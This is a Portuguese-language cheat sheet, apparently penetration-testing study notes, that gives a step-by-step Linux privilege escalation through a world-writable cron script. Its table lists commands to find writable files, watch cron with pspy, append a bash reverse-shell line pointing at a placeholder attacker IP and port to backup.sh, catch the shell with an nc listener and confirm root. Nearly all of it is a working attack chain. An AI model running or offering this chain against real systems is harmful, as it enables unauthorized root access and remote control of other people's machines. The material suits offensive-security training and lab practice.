# Comandos Principais - Cron Job Abuse

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Encontrar arquivos world-writable no sistema | Identificação de scripts potencialmente abusáveis (ex.: `backup.sh`) |
| `ls -la /dmz-backups/` | Inspecionar permissões e padrão de arquivos de backup | Confirmação de script gravável e frequência de execução |
| `./pspy64 -pf -i 1000` | Monitorar processos e eventos de filesystem sem root | Evidência de cron rodando script como root |
| `cat /dmz-backups/backup.sh` | Revisar lógica do script executado pelo cron | Entendimento do que será executado como root |
| `echo 'bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1' >> /dmz-backups/backup.sh` | Anexar payload ao script world-writable | Payload executado no próximo ciclo do cron |
| `nc -lnvp 443` | Abrir listener para conexão reversa | Recebimento de shell do alvo |
| `id` | Validar privilégio após conexão | Confirmação de `uid=0(root)` |
| `hostname` | Confirmar host comprometido | Nome do host alvo exibido |

